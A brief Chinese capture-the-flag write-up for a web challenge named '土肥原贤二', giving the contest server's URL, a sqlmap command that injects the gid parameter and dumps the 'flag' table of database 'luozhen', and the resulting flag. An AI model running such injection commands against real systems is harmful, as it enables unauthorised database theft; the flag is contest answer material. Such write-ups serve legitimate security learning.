前言

这个比赛还是很简单，但是只会搞web题目。比赛里也暴露很多问题，

0x01 土肥原贤二

http://47.103.43.235:81/quest/web/a/index.php

直接使用sqlmap注入
sqlmap -u "http://47.103.43.235:81/quest/web/a/index.php?gid=1*" -D luozhen -T flag --dump

Flag{20_welcome_19}
